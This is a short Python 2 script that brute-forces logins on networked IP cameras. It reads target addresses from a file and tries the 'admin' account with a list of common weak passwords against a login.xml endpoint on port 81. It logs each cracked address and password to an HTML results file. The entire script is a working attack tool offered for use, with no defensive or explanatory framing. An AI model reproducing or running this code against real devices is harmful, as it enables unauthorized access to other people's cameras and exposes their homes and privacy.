#!/usr/bin/python
#-*- coding: utf-8 -*-

import urllib
import urllib2
import re, sys
import time

def fuckcam():
	dict = {"pwd":['admin', 'root', '123456', '12345678', '12345', '123456789', '88888888', 'iloveyou', '123321', '123123', '666666', 'abc123', '123qwe', '5201314', '111111', '112233', 'abcdef', 'aaa111', '654321', 'abcabc', 'qq123456', 'taotao', 'wang123', 'xiaoming']}
	#dict = {"pwd":['admin']}
	pattern=re.compile(r'UserLevel>-1')
	ipfile = open(sys.path[0]+'/targetAddr.txt','r')
	resultfile = open(sys.path[0]+'/result.html', 'a')

	#for each ipaddr:
	for ipaddr in ipfile.readlines():
		ipaddr = ipaddr.strip('\n')
		for pwd in dict['pwd']:
			theUrl = "http://"+ipaddr+":81/login.xml?user=admin"+"&usr="+pwd+"&password=admin"+"&pwd="+pwd
			time.sleep(1.5)
			try:
				theResponse = urllib2.urlopen(theUrl, timeout=5)
			except urllib2.URLError, e:
				print "[Open]" + ipaddr + " :error"
				break
			thePage = theResponse.read()
			Findall = re.findall(pattern, thePage);
			if Findall:
				print "[NOTmatch]" + ipaddr + " :password not match " + pwd
				#print thePage
			else:
				print "[Vailed]" + ipaddr + " Successed " + pwd
				resultfile.writelines('<a target="_blank" href="http://'+ipaddr+':81'+'">'+ipaddr+":admin"+":"+pwd+"</a>"+'\n')
				break
	ipfile.close();
	resultfile.close();

if __name__ == '__main__':
	fuckcam()
